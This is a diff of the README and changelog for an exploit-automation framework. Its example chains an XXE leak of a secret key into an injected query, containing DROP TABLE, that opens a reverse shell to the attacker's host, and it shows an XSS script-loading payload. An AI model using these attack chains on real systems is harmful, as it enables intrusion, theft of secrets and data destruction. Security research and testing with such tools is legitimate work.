@@ -8,12 +8,11 @@ This framework was created in order to simplify attack automation and exploit de
 
 ```python
 async def reverse_shell(scenario):
-    await scenario.background(
-        requests.post,
+    await scenario.http_post(
         'http://{rhost}:{rport}/query/'.format(**scenario.context),
-        data='secret={secret}&query=DROP+TABLE+IF+EXISTS+[...]{lhost}+{lport_reverse}'.format(**scenario.context),
-        headers=scenario.context['post_headers'],
-        proxies=scenario.context['proxy']
+        'secret={secret}&query=DROP+TABLE+IF+EXISTS+[...]{lhost}+{lport_reverse}'.format(**scenario.context),
+        scenario.context['post_headers'],
+        scenario.context['proxy']
     )
 
 context = {
@@ -25,12 +24,12 @@ context = {
     'post_headers': {'Content-Type': 'application/x-www-form-urlencoded'},
 }
 
-ftpd = services.FTPReader()
+story = scenarios.Scenario(**context)
+
+ftpd = services.FTPReader(story)
 ftpd.set_event('xxe', when=triggers.DataMatch(r'.+SecretKey=(.+);', bucket='secret'))
 
-story = scenarios.Scenario(**context)
 story.debug()
-story.spawn(ftpd)
 story.add_scene(reverse_shell, when='xxe')
 story.play()
 ```
@@ -68,10 +67,11 @@ Now visit `http://127.0.0.1:8008/?message=<script src="http://127.0.0.1:8888/fak
 
 * **2021/12/12** Beta (v0.4)
     * A bit of asyncio cleaning up
-    * Fixed examples to match the new interfaces
-    * Simplified services imports
+    * Fixed examples to match the new API
+    * Simplified services imports and generally everything
     * Changed default ports
     * Added requirements to setup.py
+    * Replaced requests with aiohttp
 * **2021/08/26** Beta (v0.3)
     * Yet another refactoring.
     * Added full HTTP support using Flask.
